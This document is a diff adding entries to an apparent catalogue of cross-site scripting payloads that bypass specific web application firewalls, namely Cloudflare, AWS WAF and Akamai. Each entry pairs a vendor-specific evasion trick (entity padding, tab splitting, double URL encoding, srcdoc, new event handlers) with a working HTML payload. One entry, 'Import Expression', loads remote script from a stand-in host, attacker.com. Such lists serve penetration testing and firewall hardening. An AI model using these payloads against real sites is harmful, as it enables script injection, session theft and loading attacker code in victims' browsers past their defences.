@@ -71,3 +71,113 @@ Bypass Imperva SecureSphere WAF
 ```html
 <svg><script>alert&#40;1&#41;</script>
 ```
+
+### Cloudflare — Entity Padding
+
+HTML entity with excessive zero-padding bypasses Cloudflare regex
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<svg onload=prompt%26%230000000040document.domain)>
+```
+
+### Cloudflare — Tab Splitting
+
+Tab and newline characters in javascript: URI bypass Cloudflare
+
+- **Contexts**: url, attribute
+- **Severity**: high
+
+```html
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+```
+
+### Cloudflare — Optional Chaining
+
+JS optional chaining syntax not in Cloudflare signatures
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<svg onx=() onload=window.alert?.()>
+```
+
+### Cloudflare — Import Expression
+
+Dynamic import() bypasses script-src inline blocks
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<img src=x onError=import('//attacker.com/')>
+```
+
+### Cloudflare — Double URL Encode
+
+Double URL encoding slips past Cloudflare's single-decode check
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<--%253cimg%20onerror=alert(1)%20src=a%253e --!>
+```
+
+### Cloudflare — Ignored Attribute Prefix
+
+Invalid attribute before real event handler confuses parser
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<svg on =i onload=alert(domain)>
+```
+
+### AWS WAF — Popover API
+
+onbeforetoggle not in OWASP CRS — bypasses AWS WAF managed rules
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<button popovertarget=x>Click</button><xss popover id=x onbeforetoggle=alert(1)>
+```
+
+### AWS WAF — Content Visibility
+
+CSS-triggered event not in any WAF ruleset
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<xss oncontentvisibilityautostatechange=alert(1) style="display:block;content-visibility:auto">
+```
+
+### Akamai — SrcDoc Injection
+
+Akamai doesn't deeply inspect srcdoc attribute HTML entities
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<iframe srcdoc='&lt;script&gt;parent.alert(1)&lt;/script&gt;'>
+```
+
+### Akamai — SVG Animate
+
+SVG animatetransform onbegin bypasses Akamai event blocklist
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<svg><animatetransform onbegin=alert(1)>
+```
